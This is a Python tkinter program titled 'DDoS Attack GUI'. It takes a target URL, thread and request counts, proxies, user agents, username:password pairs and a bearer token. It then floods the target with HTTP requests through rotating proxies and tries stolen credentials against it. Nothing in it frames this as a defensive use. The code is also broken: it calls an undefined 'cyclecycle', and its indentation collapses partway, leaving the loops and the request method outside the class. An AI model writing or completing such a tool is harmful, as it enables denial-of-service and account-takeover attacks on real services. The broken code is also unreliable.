import tkinter as tk
from tkinter import messagebox
import requests
import threading
import random
import time

class DDoSAttackGUI:
    def __init__(self, master):
        self.master = master
        master.title("DDoS Attack GUI")

        # Create input fields for target URL, number of requests, and threads
        self.target_url_label = tk.Label(master, text="Target URL:")
        self.target_url_label.pack()
        self.target_url_entry = tk.Entry(master, width=50)
        self.target_url_entry.pack()

        self.num_requests_label = tk.Label(master, text="Number of Requests:")
        self.num_requests_label.pack()
        self.num_requests_entry = tk.Entry(master, width=50)
        self.num_requests_entry.pack()

        self.threads_label = tk.Label(master, text="Number of Threads:")
        self.threads_label.pack()
        self.threads_entry = tk.Entry(master, width=50)
        self.threads_entry.pack()

        # Create input fields for proxies and user agents
        self.proxies_label = tk.Label(master, text="Proxies (comma-separated):")
        self.proxies_label.pack()
        self.proxies_entry = tk.Entry(master, width=50)
        self.proxies_entry.pack()

        self.user_agents_label = tk.Label(master, text="User Agents (comma-separated):")
        self.user_agents_label.pack()
        self.user_agents_entry = tk.Entry(master, width=50)
        self.user_agents_entry.pack()

        # Create input fields for login attempts and token attacks
        self.login_attempts_label = tk.Label(master, text="Login Attempts (username:password):")
        self.login_attempts_label.pack()
        self.login_attempts_entry = tk.Entry(master, width=50)
        self.login_attempts_entry.pack()

        self.token_attack_label = tk.Label(master, text="Token Attack (token):")
        self.token_attack_label.pack()
        self.token_attack_entry = tk.Entry(master, width=50)
        self.token_attack_entry.pack()

        # Create start button
        self.start_button = tk.Button(master, text="Start Attack", command=self.start_attack)
        self.start_button.pack()

    def start_attack(self):
        # Get input values from GUI
        target_url = self.target_url_entry.get()
        num_requests = int(self.num_requests_entry.get())
        threads = int(self.threads_entry.get())
        proxies = [proxy.strip() for proxy in self.proxies_entry.get().split(",")]
        user_agents = [user_agent.strip() for user_agent in self.user_agents_entry.get().split(",")]
        login_attempts = [attempt.strip() for attempt in self.login_attempts_entry.get().split(",")]
        token_attack = self.token_attack_entry.get()

        # Start the attack
        self.attack(target_url, num_requests, threads, proxies, user_agents, login_attempts, token_attack)

    def attack(self, target_url, num_requests, threads, proxies, user_agents, login_attempts, token_attack):
        # Create threads to send requests concurrently
        threads_list = []
        proxy_cycle = cyclecycle(proxies)
for i in range(threads):
    proxy = next(proxy_cycle)
    t = threading.Thread(target=self.send_request, args=(target_url, num_requests, proxy, user_agents, login_attempts, token_attack))
    threads_list.append(t)
    t.start()

# Wait for all threads to finish
for t in threads_list:
    t.join()

messagebox.showinfo("DDoS Attack", "Attack completed!")

def send_request(self, target_url, num_requests, proxy, user_agents, login_attempts, token_attack):
for i in range(num_requests):
    try:
        user_agent = random.choice(user_agents)
        headers = {"User-Agent": user_agent}
        if login_attempts:
            username, password = random.choice(login_attempts).split(":")
            auth = (username, password)
            response = requests.get(target_url, headers=headers, proxies={"http": proxy, "https": proxy}, auth=auth)
        elif token_attack:
            headers["Authorization"] = f"Bearer {token_attack}"
            response = requests.get(target_url, headers=headers, proxies={"http": proxy, "https": proxy})
        else:
            response = requests.get(target_url, headers=headers, proxies={"http": proxy, "https": proxy})
        print(f"Request {i+1} sent! (Proxy: {proxy})")
        time.sleep(0.001)  # Wait for 0.001 seconds before sending the next request
    except Exception as e:
        print(f"Error: {e}")

root = tk.Tk()
my_gui = DDoSAttackGUI(root)
root.mainloop()